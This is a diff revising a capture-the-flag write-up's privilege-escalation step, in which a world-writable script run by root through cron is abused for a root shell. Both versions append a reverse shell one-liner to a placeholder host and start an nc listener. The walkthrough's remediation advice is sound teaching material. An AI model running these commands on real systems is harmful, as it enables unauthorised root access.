@@ -131,25 +131,25 @@ knew about the capture and never cleaned it up.
 
 ## Privilege escalation: a writable scheduled script
 
-In `~/scripts` there are two files:
+`~/scripts/planner.sh` is run by root on a schedule, and it calls **`/etc/print.sh`** &mdash;
+which is world-writable:
 
 ```bash
-ls -la ~/scripts
-# planner.sh   -> runs print.sh
-# print.sh     -> world-writable, executed by root on a schedule
+ls -la ~/scripts        # planner.sh -> runs /etc/print.sh
+ls -la /etc/print.sh    # -rwxrwxrwx : anyone can edit it
 ```
 
-`planner.sh` is run by root (cron), and it calls `print.sh`, which lennie can write to.
-Append a reverse shell, start a listener, and wait for the next scheduled run:
+Append a reverse shell to `/etc/print.sh`, start a listener, and wait for the next run:
 
 ```bash
-echo 'sh -i >& /dev/tcp/<LHOST>/9001 0>&1' >> /home/lennie/scripts/print.sh
+echo 'sh -i >& /dev/tcp/<LHOST>/9001 0>&1' >> /etc/print.sh
 
 # on your machine, before the job fires
 nc -lnvp 9001
 ```
 
-When cron runs `planner.sh`, the listener gets a shell as **root**:
+When the scheduled `planner.sh` fires and runs `/etc/print.sh`, the listener gets a shell as
+**root**:
 
 ```bash
 cat /root/root.txt
@@ -164,5 +164,6 @@ And there's the root flag, blurred the same way: <span class="spoiler">THM{redac
 - **The capture:** don't store packet captures with plaintext credentials on a production
   host, and use FTPS/SFTP so credentials aren't on the wire in the first place. The leaked
   password must be rotated.
-- **The cron script:** scripts run by root should be owned by root and not writable by any
-  lower-privilege user. `lennie` should never be able to edit `print.sh`.
+- **The cron script:** scripts run by root should be owned by root and not world-writable.
+  `/etc/print.sh` at mode `0777` means `lennie` &mdash; or any user &mdash; can edit a file
+  that root executes.
